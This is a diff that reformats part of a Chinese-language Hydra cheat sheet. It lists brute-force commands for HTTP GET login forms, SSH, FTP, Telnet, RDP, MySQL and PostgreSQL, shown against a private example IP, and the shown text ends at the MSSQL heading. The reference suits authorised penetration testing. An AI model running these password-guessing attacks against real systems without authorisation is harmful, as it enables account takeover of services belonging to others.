@@ -32,17 +32,10 @@ hydra -l admin -P pass.txt 192.168.1.100:8080 http-post-form "/login:user=^USER^
 ### 2. `http-get-form`
 
 与 `http-post-form` 类似，用于 GET 方式的登录表单。参数字符串直接附加在路径后面，用 `?` 连接。
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l admin -P pass.txt 192.168.1.100 http-get-form "/login.php?user=^USER^&pass=^PASS^:F=error"
-
+```
 ### 3. `http-head` / `https-head`
-
 用于发送 HEAD 请求并检查响应，通常用于验证页面是否存在或判断状态码，不常用作登录爆破。
 
 ---
@@ -50,90 +43,42 @@ hydra -l admin -P pass.txt 192.168.1.100 http-get-form "/login.php?user=^USER^&p
 ## 二、远程登录类
 
 ### 1. SSH
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l <用户名> -P <密码字典> ssh://<目标IP[:端口]>
-
-- **端口**：默认为 22，可省略。
-    
-- **模块名**：`ssh`。
-    
-
+```
+- **端口**：默认为 22，可省略
+- **模块名**：`ssh`
 **示例**：
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l root -P pass.txt ssh://192.168.1.100
-
+```
 ### 2. FTP
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l <用户名> -P <密码字典> ftp://<目标IP[:端口]>
-
+```
 ### 3. Telnet
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l <用户名> -P <密码字典> telnet://<目标IP[:端口]>
-
+```
 ### 4. RDP (Windows 远程桌面)
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l <用户名> -P <密码字典> rdp://<目标IP[:端口]>
-
+```
 - 注意：Hydra 对 RDP 的支持可能有限，部分版本需要额外编译。
-    
 
 ---
 
 ## 三、数据库类
 
 ### 1. MySQL
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l <用户名> -P <密码字典> mysql://<目标IP[:端口]>
-
-- 默认端口 3306。
-    
-
+```
+- 默认端口 3306
 ### 2. PostgreSQL
-
-bash
-
-复制
-
-下载
-
+```bash
 hydra -l <用户名> -P <密码字典> postgresql://<目标IP[:端口]>
-
+```
 ### 3. MSSQL
 
 bash
